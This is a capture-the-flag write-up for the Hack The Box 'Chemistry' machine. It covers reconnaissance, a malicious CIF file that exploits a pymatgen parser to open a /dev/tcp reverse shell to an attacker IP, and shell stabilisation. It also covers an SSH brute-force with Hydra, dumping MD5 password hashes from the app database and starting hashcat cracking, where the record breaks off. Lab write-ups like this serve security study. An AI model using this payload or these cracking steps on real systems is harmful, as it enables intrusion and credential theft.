# Chemistry
OS: Linux\
Difficulty: Easy

## Steps
### Recon
```Bash
┌─[us-vip-3]─[10.10.14.22]─[gntsqid@htb-xm39dvuluo]─[~]
└──╼ [★]$ nmap -Pn -F --min-rate=1000 -T5 chemistry
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-20 17:38 CST
Nmap scan report for chemistry (10.10.11.38)
Host is up (0.066s latency).
Not shown: 98 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 0.25 seconds
```
```BASH
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```Bash
PORT     STATE SERVICE VERSION
5000/tcp open  upnp?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=12/20%Time=676603A5%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,38A,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3
SF:\x20Python/3\.9\.5\r\nDate:\x20Fri,\x2020\x20Dec\x202024\x2023:54:15\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x20719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20
SF:html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=
SF:\"UTF-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"wid
SF:th=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Chemi
SF:stry\x20-\x20Home</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\
SF:x20href=\"/static/styles\.css\">\n</head>\n<body>\n\x20\x20\x20\x20\n\x
SF:20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\n\x20\x20\x20\x20<div\x20class
SF:=\"container\">\n\x20\x20\x20\x20\x20\x20\x20\x20<h1\x20class=\"title\"
SF:>Chemistry\x20CIF\x20Analyzer</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>
SF:Welcome\x20to\x20the\x20Chemistry\x20CIF\x20Analyzer\.\x20This\x20tool\
SF:x20allows\x20you\x20to\x20upload\x20a\x20CIF\x20\(Crystallographic\x20I
SF:nformation\x20File\)\x20and\x20analyze\x20the\x20structural\x20data\x20
SF:contained\x20within\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<div\x20clas
SF:s=\"buttons\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<center
SF:><a\x20href=\"/login\"\x20class=\"btn\">Login</a>\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20<a\x20href=\"/register\"\x20class=\"btn\">R
SF:egister</a></center>\n\x20\x20\x20\x20\x20\x20\x20\x20</div>\n\x20\x20\
SF:x20\x20</div>\n</body>\n<")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20PUB
SF:LIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x
SF:20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Con
SF:tent-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>
SF:\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20
SF:response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400
SF:</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20
SF:version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Er
SF:ror\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20r
SF:equest\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20
SF:</body>\n</html>\n");
```
After finding out port 5000 is running upnp, we can go to the site:\
> https://chemistry:5000


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/4826f9cc-59e4-4725-ab1a-daef61c79bef) returned 404 during the image audit (2026-10-08).


We can register with a temporary account.\
I used juice:banana for fun.

The application takes in CIF files.\
Let's see if we can find any known exploits!

### Exploit Search

```Bash
┌─[us-vip-3]─[10.10.14.22]─[gntsqid@htb-xm39dvuluo]─[~]
└──╼ [★]$ searchsploit cif
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                        |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Cifshanghai - 'chanpin_info.php' CMS SQL Injection                                                                                                    | php/webapps/10105.txt
Cisco Adaptive Security Appliance 8.x - Web VPN FTP or CIFS Authentication Form Phishing                                                              | hardware/remote/33054.txt
Cisco ASA - WebVPN CIFS Handling Buffer Overflow                                                                                                      | hardware/dos/41369.txt
GD Graphics Library 2.0.34 - 'libgd' gdImageCreateXbm Function Unspecified Denial of Service                                                          | linux/dos/30251.c
Gentoo-Specific MPG123 - URI Remote Buffer Overflow                                                                                                   | linux/dos/28160.txt
HP CIFS/9000 Server A.01.05/A.01.06 - Local Buffer Overflow                                                                                           | hp-ux/local/21577.c
Linux Kernel 2.6.x - CIFS CHRoot Security Restriction Bypass                                                                                          | linux/local/27769.txt
McAfee VirusScan 8.0 - Path Specification Privilege Escalation                                                                                        | windows/local/26970.c
mount.cifs - 'chdir()' Arbitrary Root File Identification                                                                                             | linux/local/18783.txt
nathan purciful phpphotoalbum 0.9.9 - Directory Traversal                                                                                             | php/webapps/20208.txt
NetApp OnCommand System Manager - '/zapiServlet' CIFS Configuration Management Interface Multiple Cross-Site Scripting Vulnerabilities                | php/webapps/38506.txt
Novell Netware - CIFS and AFP Remote Memory Consumption Denial of Service                                                                             | multiple/dos/11009.pl
Novell NetWare - LSASS CIFS.NLM Driver Stack Buffer Overflow (Metasploit)                                                                             | netware/remote/16832.rb
Novell NetWare 6.5 SP2-SP7 - LSASS CIFS.NLM Overflow (Metasploit)                                                                                     | novell/remote/9932.rb
Pacific Software Carello 1.2.1 - File Duplication / Source Disclosure                                                                                 | windows/remote/19957.txt
Pacific Software Carello 1.2.1 Shopping Cart - Command Execution                                                                                      | windows/remote/20850.txt
Pacific Software URL Live! 1.0 - Directory Traversal                                                                                                  | windows/remote/19568.txt
Portable Document Format - Specification Signature Collision                                                                                          | windows/remote/34437.txt
Pserv 2.0 - HTTP Version Specifier Buffer Overflow                                                                                                    | linux/dos/22056.txt
Samba 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow                                                                               | unix/remote/22356.c
Sun Java Applet 1.x - Invocation Version Specification                                                                                                | multiple/dos/24778.html
Up-IMAPProxy 1.2.3/1.2.4 - Multiple Unspecified Remote Format String Vulnerabilities                                                                  | linux/dos/26340.c
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Shellcode Title                                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Linux/x86 - Bind (User Specified Port) Shell (/bin/sh) Shellcode (102 bytes)                                                                          | linux_x86/50124.c
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
```

### Payload
Attempting to create a payload.\
We can use:
```cif
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"
 
loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]
 
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i>&/dev/tcp/10.10.14.66/1337 0>&1\'");0,0,0'
 
 
_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/fcdce1ec-38dd-4a87-bf7a-3ab7c8f8cb2d) returned 404 during the image audit (2026-10-08).


We get a shell!

> If we were to use metasploit we need *reverse_shell_tcp* payload.

```Bash
$ ls  
app.py
instance
pwned
static
templates
uploads
$ ls app.py
app.py
$ cat app.py
from flask import Flask, render_template, request, redirect, url_for, flash
from werkzeug.utils import secure_filename
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from pymatgen.io.cif import CifParser
import hashlib
import os
import uuid

app = Flask(__name__)
app.config['SECRET_KEY'] = 'MyS3cretCh3mistry4PP'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['UPLOAD_FOLDER'] = 'uploads/'
app.config['ALLOWED_EXTENSIONS'] = {'cif'}

db = SQLAlchemy(app)
login_manager = LoginManager(app)
login_manager.login_view = 'login'

class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(150), nullable=False, unique=True)
    password = db.Column(db.String(150), nullable=False)

class Structure(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    filename = db.Column(db.String(150), nullable=False)
    identifier = db.Column(db.String(100), nullable=False, unique=True)

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in app.config['ALLOWED_EXTENSIONS']

def calculate_density(structure):
    atomic_mass_Si = 28.0855
    num_atoms = 2
    mass_unit_cell = num_atoms * atomic_mass_Si
    mass_in_grams = mass_unit_cell * 1.66053906660e-24
    volume_in_cm3 = structure.lattice.volume * 1e-24
    density = mass_in_grams / volume_in_cm3
    return density

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if User.query.filter_by(username=username).first():
            flash('Username already exists.')
            return redirect(url_for('register'))
        hashed_password = hashlib.md5(password.encode()).hexdigest()
        new_user = User(username=username, password=hashed_password)
        db.session.add(new_user)
        db.session.commit()
        login_user(new_user)
        return redirect(url_for('dashboard'))
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        user = User.query.filter_by(username=username).first()
        if user and user.password == hashlib.md5(password.encode()).hexdigest():
            login_user(user)
            return redirect(url_for('dashboard'))
        flash('Invalid credentials')
    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('index'))

@app.route('/dashboard')
@login_required
def dashboard():
    structures = Structure.query.filter_by(user_id=current_user.id).all()
    return render_template('dashboard.html', structures=structures)

@app.route('/upload', methods=['POST'])
@login_required
def upload_file():
    if 'file' not in request.files:
        return redirect(request.url)
    file = request.files['file']
    if file.filename == '':
        return redirect(request.url)
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        identifier = str(uuid.uuid4())
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], identifier + '_' + filename)
        file.save(filepath)
        new_structure = Structure(user_id=current_user.id, filename=filename, identifier=identifier)
        db.session.add(new_structure)
        db.session.commit()
        return redirect(url_for('dashboard'))
    return redirect(request.url)

@app.route('/structure/<identifier>')
@login_required
def show_structure(identifier):
    structure_entry = Structure.query.filter_by(identifier=identifier, user_id=current_user.id).first_or_404()
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], structure_entry.identifier + '_' + structure_entry.filename)
    parser = CifParser(filepath)
    structures = parser.parse_structures()
    
    structure_data = []
    for structure in structures:
        sites = [{
            'label': site.species_string,
            'x': site.frac_coords[0],
            'y': site.frac_coords[1],
            'z': site.frac_coords[2]
        } for site in structure.sites]
        
        lattice = structure.lattice
        lattice_data = {
            'a': lattice.a,
            'b': lattice.b,
            'c': lattice.c,
            'alpha': lattice.alpha,
            'beta': lattice.beta,
            'gamma': lattice.gamma,
            'volume': lattice.volume
        }
        
        density = calculate_density(structure)
        
        structure_data.append({
            'formula': structure.formula,
            'lattice': lattice_data,
            'density': density,
            'sites': sites
        })
    
    return render_template('structure.html', structures=structure_data)

@app.route('/delete_structure/<identifier>', methods=['POST'])
@login_required
def delete_structure(identifier):
    structure = Structure.query.filter_by(identifier=identifier, user_id=current_user.id).first_or_404()
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], structure.identifier + '_' + structure.filename)
    if os.path.exists(filepath):
        os.remove(filepath)
    db.session.delete(structure)
    db.session.commit()
    return redirect(url_for('dashboard'))

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(host='0.0.0.0', port=5000)
```

---
```Bash
$ id
uid=1001(app) gid=1001(app) groups=1001(app)
```
```Bash
$ python3 --version
Python 3.8.10
```
```Bash
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
app:x:1001:1001:,,,:/home/app:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```
```Bash
$ uname -r
5.4.0-196-generic
$ cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
```

Let us try to stabilize our shell next!\
Use something like...
```Python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
> This is super helpful with navigation and elevating commands
```Bash
┌─[us-vip-3]─[10.10.14.22]─[gntsqid@htb-xm39dvuluo]─[~]
└──╼ [★]$ nc -lvnp 7777
listening on [any] 7777 ...
connect to [10.10.14.22] from (UNKNOWN) [10.10.11.38] 33992
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
app@chemistry:~$ whoami
whoami
app
app@chemistry:~$ pwd
pwd
/home/app
app@chemistry:~$ ls
ls
app.py  instance  pwned  static  templates  uploads
app@chemistry:~$ 
```

I ran LinPEAS:


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/59f41d88-7c90-4019-9010-92f36b18351c) returned 404 during the image audit (2026-10-08).


```Bash
╔══════════╣ Users with console
app:x:1001:1001:,,,:/home/app:/bin/bash
root:x:0:0:root:/root:/bin/bash
rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
```
```Bash
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/curl
/usr/bin/g++
/usr/bin/gcc
/usr/bin/make
/usr/bin/nc
/usr/bin/netcat
/usr/bin/perl
/usr/bin/ping
/usr/bin/python3
/usr/bin/sudo
/usr/bin/wget
```
```Bash
╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/pam.d/common-password
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/python3/dist-packages/keyring/credentials.py
/usr/lib/python3/dist-packages/keyring/__pycache__/credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/keyring/__pycache__/credentials.cpython-39.pyc
/usr/lib/python3/dist-packages/launchpadlib/credentials.py
/usr/lib/python3/dist-packages/launchpadlib/__pycache__/credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/__pycache__/test_credential_store.cpython-38.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/test_credential_store.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-38.pyc
/usr/lib/systemd/systemd-reply-password
/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.service
/usr/lib/systemd/system/systemd-ask-password-plymouth.path
/usr/lib/systemd/system/systemd-ask-password-plymouth.service
  #)There are more creds/passwds files in the previous parent folder

/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/netrc/t-git-credential-netrc.sh
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/man/man1/git-credential.1.gz
/usr/share/man/man1/git-credential-cache.1.gz
/usr/share/man/man1/git-credential-cache--daemon.1.gz
/usr/share/man/man1/git-credential-store.1.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man7/gitcredentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Searching passwords inside logs (limit 70)
[    4.666678] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
[    5.754596] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
Binary file /var/log/journal/50eeb7fac3464e29ad4e2725d371e6c5/user-1001.journal matches
```

I also attempted to run Hydra:
```Bash
┌─[us-vip-3]─[10.10.14.22]─[gntsqid@htb-xm39dvuluo]─[~]
└──╼ [★]$ hydra -l rosa -P /usr/share/wordlists/rockyou.txt -t 4 10.10.11.38 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-20 23:10:42
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.10.11.38:22/
[STATUS] 36.00 tries/min, 36 tries in 00:01h, 14344363 to do in 6640:55h, 4 active
[STATUS] 28.00 tries/min, 84 tries in 00:03h, 14344315 to do in 8538:17h, 4 active
[STATUS] 26.29 tries/min, 184 tries in 00:07h, 14344215 to do in 9095:04h, 4 active
```

---
> From this point on, I am following Juan's notes as I do not know yet what I am doing.

### SQL
It looks like there is a database within this machine.
```Bash
app@chemistry:~$ cd instance	
cd instance
app@chemistry:~/instance$ ls
ls
database.db
```
```Bash
sqlite3 database.db
```
```Bash
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .help         
.help
.archive ...             Manage SQL archives
.auth ON|OFF             Show authorizer callbacks
.backup ?DB? FILE        Backup DB (default "main") to FILE
.bail on|off             Stop after hitting an error.  Default OFF
.binary on|off           Turn binary output on or off.  Default OFF
.cd DIRECTORY            Change the working directory to DIRECTORY
.changes on|off          Show number of rows changed by SQL
.check GLOB              Fail if output since .testcase does not match
.clone NEWDB             Clone data into NEWDB from the existing database
.databases               List names and files of attached databases
.dbconfig ?op? ?val?     List or change sqlite3_db_config() options
.dbinfo ?DB?             Show status information about the database
.dump ?TABLE? ...        Render all database content as SQL
.echo on|off             Turn command echo on or off
.eqp on|off|full|...     Enable or disable automatic EXPLAIN QUERY PLAN
.excel                   Display the output of next command in spreadsheet
.exit ?CODE?             Exit this program with return-code CODE
.expert                  EXPERIMENTAL. Suggest indexes for queries
.explain ?on|off|auto?   Change the EXPLAIN formatting mode.  Default: auto
.filectrl CMD ...        Run various sqlite3_file_control() operations
.fullschema ?--indent?   Show schema and the content of sqlite_stat tables
.headers on|off          Turn display of headers on or off
.help ?-all? ?PATTERN?   Show help text for PATTERN
.import FILE TABLE       Import data from FILE into TABLE
.imposter INDEX TABLE    Create imposter table TABLE on index INDEX
.indexes ?TABLE?         Show names of indexes
.limit ?LIMIT? ?VAL?     Display or change the value of an SQLITE_LIMIT
.lint OPTIONS            Report potential schema issues.
.load FILE ?ENTRY?       Load an extension library
.log FILE|off            Turn logging on or off.  FILE can be stderr/stdout
.mode MODE ?TABLE?       Set output mode
.nullvalue STRING        Use STRING in place of NULL values
.once (-e|-x|FILE)       Output for the next SQL command only to FILE
.open ?OPTIONS? ?FILE?   Close existing database and reopen FILE
.output ?FILE?           Send output to FILE or stdout if FILE is omitted
.parameter CMD ...       Manage SQL parameter bindings
.print STRING...         Print literal STRING
.progress N              Invoke progress handler after every N opcodes
.prompt MAIN CONTINUE    Replace the standard prompts
.quit                    Exit this program
.read FILE               Read input from FILE
.recover                 Recover as much data as possible from corrupt db.
.restore ?DB? FILE       Restore content of DB (default "main") from FILE
.save FILE               Write in-memory database into FILE
.scanstats on|off        Turn sqlite3_stmt_scanstatus() metrics on or off
.schema ?PATTERN?        Show the CREATE statements matching PATTERN
.selftest ?OPTIONS?      Run tests defined in the SELFTEST table
.separator COL ?ROW?     Change the column and row separators
.session ?NAME? CMD ...  Create or control sessions
.sha3sum ...             Compute a SHA3 hash of database content
.shell CMD ARGS...       Run CMD ARGS... in a system shell
.show                    Show the current values for various settings
.stats ?on|off?          Show stats or turn stats on or off
.system CMD ARGS...      Run CMD ARGS... in a system shell
.tables ?TABLE?          List names of tables matching LIKE pattern TABLE
.testcase NAME           Begin redirecting output to 'testcase-out.txt'
.testctrl CMD ...        Run various sqlite3_test_control() operations
.timeout MS              Try opening locked tables for MS milliseconds
.timer on|off            Turn SQL timer on or off
.trace ?OPTIONS?         Output each SQL statement as it is run
.vfsinfo ?AUX?           Information about the top-level VFS
.vfslist                 List all available VFSes
.vfsname ?AUX?           Print the name of the VFS stack
.width NUM1 NUM2 ...     Set column widths for "column" mode
```
So, let's start by checking what sort of tables there are.
```Bash
sqlite> .tables
.tables
structure  user
```
Awesome, we found one for users.
```bash
sqlite> .schema user
.schema user
CREATE TABLE user (
        id INTEGER NOT NULL,
        username VARCHAR(150) NOT NULL,
        password VARCHAR(150) NOT NULL,
        PRIMARY KEY (id),
        UNIQUE (username)
);
```
```Bash
select * from user;
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|jungle|57f7e96f370e04546066ee921424c760
```
We want to separate this stuff...\
Using awk:
```Bash
[slang@crucible /tmp/12-23]$ cat hash | awk -F '|' {'print $3'}
2861debaf8d99436a10ed6f75a252abf
197865e46b878d9e74a0346b6d59886a
63ed86ee9f624c7b14f1d4f43dc251a5
02fcf7cfc10adc37959fb21f06c6b467
3dec299e06f7ed187bac06bd3b670ab2
9ad48828b0955513f7cf0f7f6510c8f8
6845c17d298d95aa942127bdad2ceb9b
c3601ad2286a4293868ec2a4bc606ba3
a4aa55e816205dc0389591c9f82f43bb
6cad48078d0241cca9a7b322ecd073b3
4af70c80b68267012ecdac9a7e916d18
4e5d71f53fdd2eabdbabb233113b5dc0
9347f9724ca083b17e39555c36fd9007
6896ba7b11a62cacffbdaded457c6d92
57f7e96f370e04546066ee921424c760
```
or with cut:
```Bash
# cut
# '-d' delimiter
# '-f' the section
# 'hash' the input name
[slang@crucible /tmp/12-23]$ cut -d '|' -f 3 hash
2861debaf8d99436a10ed6f75a252abf
197865e46b878d9e74a0346b6d59886a
63ed86ee9f624c7b14f1d4f43dc251a5
02fcf7cfc10adc37959fb21f06c6b467
3dec299e06f7ed187bac06bd3b670ab2
9ad48828b0955513f7cf0f7f6510c8f8
6845c17d298d95aa942127bdad2ceb9b
c3601ad2286a4293868ec2a4bc606ba3
a4aa55e816205dc0389591c9f82f43bb
6cad48078d0241cca9a7b322ecd073b3
4af70c80b68267012ecdac9a7e916d18
4e5d71f53fdd2eabdbabb233113b5dc0
9347f9724ca083b17e39555c36fd9007
6896ba7b11a62cacffbdaded457c6d92
57f7e96f370e04546066ee921424c760
```
#### Hash Cracking
Now lets take those hashes and see what we can find!\
First, what sort of hashes are these...and how can I find out?\
They are 32 characters long, making it likely to be MD5.
```Bash
man hashcat :/MD5
###
Hash types
       0 = MD5
```
```Bash
┌─[us-vip-3]─[10.10.14.19]─[gntsqid@htb-cyfdkzz7f3]─[~/Documents]
└──╼ [★]$ hashcat -m 0 hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD EPYC 7543 32-Core Processor, skipped

OpenCL API (OpenCL 2.1 LINUX) - Platform #2 [Intel(R) Corporation]
==================================================================
* Device #2: AMD EPYC 7543 32-Core Processor, 3919/7902 MB (987 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 15 digests; 15 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
